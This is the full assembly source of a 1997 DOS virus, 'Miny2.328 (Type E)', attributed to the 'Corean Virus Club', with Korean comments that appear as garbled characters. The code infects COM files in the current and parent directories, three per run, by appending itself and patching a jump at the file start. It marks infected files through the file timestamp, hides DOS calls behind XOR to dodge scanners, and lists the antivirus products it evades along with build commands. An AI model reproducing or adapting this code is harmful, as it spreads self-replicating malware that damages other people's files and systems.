;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                                               CVC #02  97/09
; Virus Name : Miny2.328 (Type E)
; Author : Osiris
; Group : CVC (Corean Virus Club), Corea
; Date : 1997/08/24
;
; Type : Non-resident COM infector
;
; Miny2 (Type D) �� �����e���a.
;
; �a�q�� �{�e �� ����A���a.
;
; 1. �e�� ���Bɡ�� �� �a���a �w�� ���Bɡ���A�ᕡ �a���i�i �q�q��ǩ �� ���a.
; 2. �e��A 3 ���� COM �a���i �q�q��ǩ �� ���a.
; 3. COMMAND.COM �e �q�q�A�� �A�A�E�a.
;
; AVP 970812,DSAV 7.73,F-PROT 2.72a,PCSCAN 315,SCAN 9708,TBAV 8.02,V3 : ���e x
; �e, F-prot �� �������w �񬂵A�e ���e �E�a.
;
; �ᷡ�w �� �a����a�i �e���e Miny2 �� �a�A�b�a�� ���� �i�v�a�e �e�a.
; Type E ����e ���w Miny2 ���e ���a �a�e �����i �a���� ���a.
;
; TASM MINY2E      \
; TLINK MINY2E      >  ��З �w��
; EXE2COM MINY2E   /
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL  TINY
            .CODE

 Miny2:     nop                         ; �a�A���t (�a������ �e�e�a.)
            nop                         ; �|���� ������ �a����a�a �a�A�A��
            nop                         ; �����A �� �t�i �����a.
 start:
            call  Next                  ; �a����a ���b�� ���a��
 Next:      pop   bp                    ;
            nop                         ; nop �i ���១�e 'Howard' �� ���e
            sub   bp,offset Next        ; BP = �a����a ���b����

            lea   si,COM_head[BP]       ; COM �|���� ����
            mov   di,0FFh               ; DI �i 100h �� �s�a �១�e
            inc   di                    ;
            push  di                    ; TBSCAN �A�� 'O' �wȁ�a �i���e�a.
            movsw                       ;
            movsb                       ;

            mov   cx,0080h              ; DTA �� �a�wЁ PSP ���w �����a �a�A
            mov   si,0080h              ; �A�a�� �q�� ��w�e�a.
            lea   di,End_Virus[BP]      ;
            repz  movsb

            mov   ah,(47h xor 49h)
            xor   dl,dl                 ; �� ���Bɡ�� ��w
            mov   si, BP
            add   si, offset OldDir + 1 ;
            mov   byte ptr OldDir[BP],'\'
            call  int21                 ;

            mov   byte ptr Count[BP],00 ; �q�q�a���� 0

 FindFirst:
            mov   ah,(4Eh xor 49h)      ; �a�� �x��
            mov   cx,00100011B          ; �a�� ����
            lea   dx,Match_COM[BP]      ; �x���a �a�e �a�� (*.c?m)
 Find:      call  Int21
            jc    ChgDir                ; �A��e �w�� ���Bɡ���� ����
            call  ChkInfected           ; �q�q ��˥ ѡ
            cmp   byte ptr Count[BP],3  ; 3 �� �q�q ���v�a ?
            jz    Restart               ; �a��e �q�q �ɕ� �{
            mov   ah,(4Fh xor 49h)      ; �a�q �a�� �x��
            jmp   Find

 ChgDir:    mov   ah,3Bh                ; �w�� ���Bɡ���� ����
            lea   dx, UP[BP]
            int   21h
            jnc   FindFirst             ; �w�ᝡ ����Ж�a�e �a�� COM �x��
 Restart:
            mov   ah,3Bh                ; ���� ���Bɡ���� ����
            lea   dx, OldDir[BP]
            int   21h

            lea   si,End_Virus[BP]      ; ���� DTA ����
            mov   di,0080h
            mov   cx,0080h
            repz  movsb
            RET                         ; ���� COM �a�� ��З

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
; ���A �a����a �q�q ��˥
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 ChkInfected:                           ; �q�q �a���i �·��e�a.
            cmp   word ptr DS:[009Eh],'OC' ; COMMAND.COM ���a ?
            jz    ErrorRtn
            mov   al,DS:[0096h]         ; 62 �� ���� ��a�e�a.
            and   al,1Fh
            cmp   al,1Fh
            jnz   Infect
 ErrorRtn:  RET                         ; 62 �� ���e �a�q �a�� ��a�� ���ự

 Infect:    mov   ax,(4301h XOR 4949h)  ; ����/�a�� �����a�� �a��
            xor   cx,cx
            mov   dx,009Eh
            call  Int21
            jc    ErrorRtn              ; �A�� �i��

            mov   ax,(3D02h xor 4949h)  ; �a�� ���e
            call  Int21
            jc    ErrorRtn              ;

            xchg  ax,bx                 ; BX = �a��Ѕ�i

            mov   ax,(5700h XOR 49h)    ; �a�� �b�� ���e �苡
            call  Int21
            push  cx                    ; �b�� ���e ��w
            push  dx                    ;

            mov   ah,(3Fh XOR 49h)      ; �|���� ����
            lea   dx,COM_Head[BP]       ; ���� ����
            mov   cx,0003               ; 3 �a���a
            call  Int21
            cmp   byte ptr COM_Head[BP],'M' ; MZ ���a ?
            jnz   lseek2
            cmp   byte ptr COM_Head[BP+1],'Z'
            jz    Error
 lseek2:
            mov   al,02                 ; �a�� �{�a�� ����
            call  lseek
            or    dx,dx                 ; 64 KB ���w���a ?
            jnz   Error                 ; �a�q ��a�� ���e ��ǡ�� �g����Ё��

            sub   ax,3                  ; ���a�t ���e
            mov   word ptr JumpCode[BP+1],ax     ;

            mov   ah,(40h XOR 49h)      ; �a����a �a��
            mov   cx,offset (End_virus - start)
            lea   dx,start[BP]
            call  int21

            mov   al,00                 ; ��q�a�� ����
            call  lseek

            mov   ah,(40h xor 49h)      ; ���a š�a �a��
            mov   cx,0003
            mov   byte ptr JumpCode[BP],0EAh
            dec   byte ptr JumpCode[BP] ; E9h = JMP
            lea   dx,JumpCode[BP]
            call  int21

            inc   byte ptr Count[BP]    ; �q�q ���� �w�a
 Error:
            pop   dx                    ; �a�� �b�� ���e ����
            pop   cx                    ;
            or    cx,+1Fh               ; 62 ���� �e�i��
            mov   ax,(5701h XOR 4949h)  ; �a�� �b�� ���e ����
            call  Int21

            mov   ah,(3Eh XOR 49h)      ; �a�� �h��
            call  Int21
            RET

 lseek:                                 ; ͡���� ����
            xor   cx,cx
            xor   dx,dx
            mov   ah,40h                ; AH=42h
            inc   ah                    ;
            inc   ah
            int   21h
            ret

 Int21:                                 ; XOR 49h �e�eҁ
            xor   ax,4949h              ; ������a 21h ѡ
            int   21h
            ret


 COM_head   db    0CDh,20h,90h          ; COM �|����
 Match_COM  db    '*.c?m',00            ; COM �a�� �x��
 Up         db    '..',00               ; �w�� ���Bɡ��
            db    'Miny2'               ; ���� 2
            db    '(c) 1997 Osiris of CVC,Corea',00
 End_Virus:                             ; ���A �ỡ�e �a����a �{


 Count      db    ?                     ; �q�q ����
 JumpCode   db    ?,?,?                 ; ���a �t
 OldDir     db    ?                     ; �� ���Bɡ�� ��w �w��
            db    80h dup (0)
 OldDTA     db    80h dup (0)           ; �� DTA ���w ��w
            END   Miny2

